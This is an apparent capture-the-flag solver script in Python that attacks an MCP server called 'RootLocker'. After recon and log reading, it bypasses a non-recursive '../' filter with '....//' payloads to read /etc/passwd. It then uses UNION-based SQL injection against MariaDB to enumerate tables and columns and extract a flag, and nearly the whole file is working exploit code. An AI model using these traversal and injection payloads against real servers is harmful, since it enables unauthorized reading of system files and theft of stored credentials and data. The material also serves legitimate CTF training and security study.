#!/usr/bin/env python3
"""
RootLocker MCP Server Security Assessment Solver
Demonstrates two vulnerabilities:
  1. SQL Injection  — UNION-based extraction via password://{platform}
     The platform parameter is embedded unsanitised into a MariaDB query.
     Spaces are %20-encoded and # (%23) is used as the MariaDB comment char
     because -- requires a trailing space which is stripped by URI parsers.

  2. Path Traversal — getfile://{file_name*} sanitises "../" sequences with a
     single non-recursive replace, so "....//"-style payloads survive one
     edit pass and resolve to "../" after the replace, escaping the storage
     root (/app/storage/) at runtime.

Flag is stored in the SQL database (flag table) and obtained via SQLi.
"""
import argparse
import asyncio
import re

from fastmcp import Client


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def find_htb(text: str) -> str | None:
    m = re.search(r"HTB\{[^}]+\}", text)
    return m.group(0) if m else None


async def rr(client: Client, uri: str) -> str:
    """Read a resource, returning text or the error message."""
    try:
        result = await client.read_resource(uri)
        return result[0].text
    except Exception as e:
        return f"ERR: {e}"


def sqli_uri(payload: str) -> str:
    """
    Build a password:// URI carrying a SQL injection payload.
    Encode spaces as %20, hash (#) as %23, equals (=) as %3D so the
    FastMCP URI validator accepts the string.
    """
    encoded = (
        payload
        .replace(" ", "%20")
        .replace("#", "%23")
        .replace("=", "%3D")
    )
    return f"password://{encoded}"


# ---------------------------------------------------------------------------
# Recon
# ---------------------------------------------------------------------------

async def recon(client: Client) -> None:
    """Print all available resources, templates and tools."""
    print("[*] Enumerating MCP capabilities...\n")

    resources = await client.list_resources()
    resource_templates = await client.list_resource_templates()
    tools = await client.list_tools()

    print("  Resources:")
    for r in resources:
        print(f"    {r.uri}  —  {r.description.strip()}")

    print("  Resource Templates:")
    for rt in resource_templates:
        print(f"    {rt.uriTemplate}  —  {rt.description.strip()}")

    print("  Tools:")
    for t in tools:
        params = list(t.inputSchema.get("properties", {}).keys())
        print(f"    {t.name}({', '.join(params)})  —  {t.description.strip()}")

    print()


# ---------------------------------------------------------------------------
# Info Disclosure
# ---------------------------------------------------------------------------

async def info_disclosure(client: Client) -> None:
    """Read access and error logs for sensitive information."""
    print("[*] Checking logs for sensitive information disclosure...")

    for uri, label in [
        ("resource://access_logs", "Access Logs"),
        ("resource://error_logs",  "Error Logs"),
    ]:
        content = await rr(client, uri)
        flag = find_htb(content)
        if flag:
            print(f"  [!] HTB flag in {label}: {flag}")
        else:
            lines = content.strip().splitlines()
            print(f"  {label}: {len(lines)} line(s) — {lines[-1][:80] if lines else '(empty)'}")

    # List stored platforms (IDOR surface)
    platforms = await rr(client, "resource://platforms")
    print(f"  Stored platforms: {platforms}")
    print()


# ---------------------------------------------------------------------------
# Path Traversal
# ---------------------------------------------------------------------------

async def path_traversal(client: Client) -> None:
    """
    Demonstrate path traversal via getfile://.

    The server sanitises "../" with a single str.replace, so the payload
    "....//X" → after removing first "../" match at offset 2 → "../X",
    which resolves outside /app/storage/ at OS level.

    "....//....//X" → "../X" → "../X"  (two levels up from storage root)
    reaching "/" when storage root is one level deep.
    """
    print("[*] Testing path traversal on getfile://...")

    # Confirm bypass: read /etc/passwd (two levels up from /app/storage/)
    passwd = await rr(client, "getfile://....//....//etc/passwd")
    if "ERR" not in passwd:
        print("  [+] Path traversal confirmed — /etc/passwd readable:")
        for line in passwd.splitlines()[:5]:
            print(f"    {line}")
        print("    ...")
    else:
        print(f"  [-] Traversal failed: {passwd[:100]}")

    print()


# ---------------------------------------------------------------------------
# SQL Injection
# ---------------------------------------------------------------------------

async def sql_injection(client: Client) -> str:
    """
    Exploit UNION-based SQL injection in password://{platform}.

    The backend query is:
        SELECT password FROM passwords WHERE platform='<input>' LIMIT 1

    We confirm injection, enumerate the schema, and extract the flag.
    """
    print("[*] Exploiting SQL injection on password://...")

    # Step 1 — break the query; MariaDB error confirms injection point
    err = await rr(client, "password://rootlocker.htb'")
    if "SQL syntax" in err or "1064" in err:
        print("  [+] SQL injection confirmed (unhandled syntax error returned)")
    else:
        print(f"  [?] Unexpected response: {err[:80]}")

    # Step 2 — UNION with 1 column (MariaDB # comment)
    r = await rr(client, sqli_uri("x' UNION SELECT 1#"))
    assert r == "1", f"UNION probe failed: {r}"
    print(f"  [+] UNION SELECT confirmed — 1 column, result: {r}")

    # Step 3 — current database
    db = await rr(client, sqli_uri("x' UNION SELECT database()#"))
    print(f"  [+] Current database: {db}")

    # Step 4 — enumerate tables
    tables_raw = await rr(
        client,
        sqli_uri(
            "x' UNION SELECT group_concat(table_name) "
            "FROM information_schema.tables "
            "WHERE table_schema=database()#"
        ),
    )
    tables = [t.strip() for t in tables_raw.split(",")]
    print(f"  [+] Tables: {tables}")

    # Step 5 — enumerate columns for each table
    for tbl in tables:
        cols = await rr(
            client,
            sqli_uri(
                f"x' UNION SELECT group_concat(column_name) "
                f"FROM information_schema.columns "
                f"WHERE table_name='{tbl}'#"
            ),
        )
        print(f"  [+] {tbl} columns: {cols}")

    # Step 6 — extract flag
    flag_raw = await rr(client, sqli_uri("x' UNION SELECT group_concat(flag) FROM flag#"))
    print(f"  [+] Raw flag data: {flag_raw}")

    flag = find_htb(flag_raw) or flag_raw.strip()
    return flag


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="RootLocker MCP Server Security Assessment Solver"
    )
    parser.add_argument("--host", default="154.57.164.78")
    parser.add_argument("--port", type=int, default=32605)
    return parser.parse_args()


async def main() -> None:
    args = parse_args()
    target = f"http://{args.host}:{args.port}/mcp/"
    print(f"[*] Target: {target}\n")

    async with Client(target) as client:
        await recon(client)
        await info_disclosure(client)
        await path_traversal(client)
        flag = await sql_injection(client)

    print()
    print("=" * 60)
    print(f"  Flag: {flag}")
    print("=" * 60)


if __name__ == "__main__":
    asyncio.run(main())
